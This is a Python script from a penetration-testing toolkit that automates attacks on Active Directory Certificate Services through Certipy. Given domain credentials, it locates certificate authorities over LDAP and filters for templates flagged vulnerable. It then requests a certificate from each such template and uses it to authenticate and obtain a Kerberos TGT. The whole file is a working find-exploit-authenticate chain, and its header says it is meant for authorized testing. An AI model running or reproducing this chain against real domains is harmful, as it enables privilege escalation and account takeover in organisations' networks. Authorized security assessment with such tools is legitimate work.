# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
import subprocess
from ldap3 import Server, Connection, ALL
import argparse
import os

def find_ca(server_ip, domain, username, password):
    server = Server(server_ip, get_info=ALL)
    conn = Connection(server, user=f'{domain}\\{username}', password=password, auto_bind=True)

    conn.search('CN=Configuration,DC=' + domain.replace('.', ',DC='),
                '(objectClass=pKIEnrollmentService)',
                attributes=['dNSHostName', 'cn'])

    ca_list = []
    for entry in conn.entries:
        ca_name = entry.cn.value
        ca_host = entry.dNSHostName.value
        ca_list.append((ca_host, ca_name))

    return ca_list

def run_certipy_find(domain, username, password, ca_host):
    command = [
        'certipy', 'find',
        '-u', f'{domain}\\{username}',
        '-p', password,
        '-target', ca_host,
        '-stdout'
    ]
    print(f"[+] Enumerating templates on: {ca_host}")
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def parse_vulnerable_templates(output):
    vulnerable = []
    for line in output.splitlines():
        if "VULNERABLE" in line.upper():
            template = line.split(":")[0].strip()
            vulnerable.append(template)
    return vulnerable

def run_certipy_request(domain, username, password, ca_host, template):
    pfx_filename = f'{username}_{template}.pfx'
    command = [
        'certipy', 'request',
        '-u', f'{domain}\\{username}',
        '-p', password,
        '-target', ca_host,
        '-template', template,
        '-output', pfx_filename
    ]
    print(f"[+] Requesting certificate using template: {template}")
    subprocess.run(command)
    return pfx_filename if os.path.exists(pfx_filename) else None

def run_certipy_auth(pfx_file):
    command = [
        'certipy', 'auth',
        '-pfx', pfx_file,
        '-stdout'
    ]
    print(f"[+] Attempting authentication using: {pfx_file}")
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def main():
    parser = argparse.ArgumentParser(description="Certipy Wrapper: Find → Exploit → Authenticate")
    parser.add_argument('--domain', required=True, help='Domain name (e.g. corp.local)')
    parser.add_argument('--username', required=True, help='Username')
    parser.add_argument('--password', required=True, help='Password')
    parser.add_argument('--dc-ip', required=True, help='Domain Controller IP')

    args = parser.parse_args()

    ca_list = find_ca(args.dc_ip, args.domain, args.username, args.password)
    if not ca_list:
        print("[-] No CAs found.")
        return

    for ca_host, ca_name in ca_list:
        print(f"[+] Found CA: {ca_name} on {ca_host}")

        output = run_certipy_find(args.domain, args.username, args.password, ca_host)
        vulnerable_templates = parse_vulnerable_templates(output)

        if not vulnerable_templates:
            print(f"[-] No vulnerable templates found on {ca_host}")
            continue

        for template in vulnerable_templates:
            # Request certificate
            pfx = run_certipy_request(args.domain, args.username, args.password, ca_host, template)

            if not pfx:
                print(f"[-] Failed to request certificate for {template}")
                continue

            print(f"[+] Certificate saved: {pfx}")

            # Attempt authentication
            auth_result = run_certipy_auth(pfx)

            print("[+] Authentication Response:")
            print(auth_result)

            if "TGT" in auth_result or "success" in auth_result.lower():
                print(f"[+] SUCCESS: Authentication worked using template: {template}")
            else:
                print(f"[-] Authentication failed with template: {template}")

if __name__ == '__main__':
    main()
